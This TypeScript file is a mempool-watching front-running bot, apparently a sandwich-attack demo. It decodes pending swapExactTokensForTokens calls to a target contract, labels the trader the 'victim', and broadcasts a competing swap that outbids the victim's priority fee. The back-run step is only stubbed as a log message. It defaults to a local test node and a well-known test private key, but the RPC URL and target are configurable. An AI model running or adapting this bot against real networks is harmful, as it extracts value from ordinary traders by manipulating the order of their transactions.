import { WebSocketProvider, Wallet, Interface, formatEther } from 'ethers';

// Minimal ABI for parsing target transaction
const OperatorABI = [
  "function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)"
];

const RPC_URL = process.env.RPC_URL || 'ws://127.0.0.1:8545';
// Default anvil account #0 as the attacker
const PRIVATE_KEY = process.env.PRIVATE_KEY || '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const TARGET_CONTRACT = process.env.TARGET_CONTRACT || '0x0000000000000000000000000000000000000000'; // Replace with deployed operator

async function startBot() {
    const provider = new WebSocketProvider(RPC_URL);
    const attackerWallet = new Wallet(PRIVATE_KEY, provider);
    const iface = new Interface(OperatorABI);

    console.log('🥪 MEV Bot listening to local mempool on', RPC_URL);

    provider.on('pending', async (txHash: string) => {
        try {
            const tx = await provider.getTransaction(txHash);
            
            if (tx && tx.to && tx.to.toLowerCase() === TARGET_CONTRACT.toLowerCase()) {
                const decodedData = iface.parseTransaction({ data: tx.data, value: tx.value });
                
                if (decodedData?.name === 'swapExactTokensForTokens') {
                    console.log(`\n🎯 Target Swap Detected! TX: ${txHash}`);
                    const amountIn = decodedData.args[0];
                    const amountOutMin = decodedData.args[1];
                    
                    console.log(`Victim Amount In: ${formatEther(amountIn)}`);
                    console.log(`Victim Min Out: ${formatEther(amountOutMin)}`);

                    const victimPriorityFee = tx.maxPriorityFeePerGas || 0n;
                    const botNonce = await provider.getTransactionCount(attackerWallet.address);

                    console.log('🚀 Sending Front-run transaction...');
                    const frontRunTx = await attackerWallet.sendTransaction({
                        to: TARGET_CONTRACT,
                        data: iface.encodeFunctionData('swapExactTokensForTokens', [
                            amountIn / 2n, // Example front-run trade size
                            0, // Accept any output for the front-run to execute quickly
                            decodedData.args[2], // Same path to pump price
                            attackerWallet.address,
                            Math.floor(Date.now() / 1000) + 60 * 10
                        ]),
                        maxPriorityFeePerGas: victimPriorityFee + 1n, // Outbid victim!
                        nonce: botNonce,
                        gasLimit: 300000
                    });

                    console.log('📉 Sending Back-run transaction... [In a full setup, this waits for the victim transaction state]');
                    
                    console.log(`✅ Front-run broadcasted: ${frontRunTx.hash}`);
                }
            }
        } catch (error) {
            // Ignore any standard transactions we can't parse or non-targets
        }
    });
}

startBot();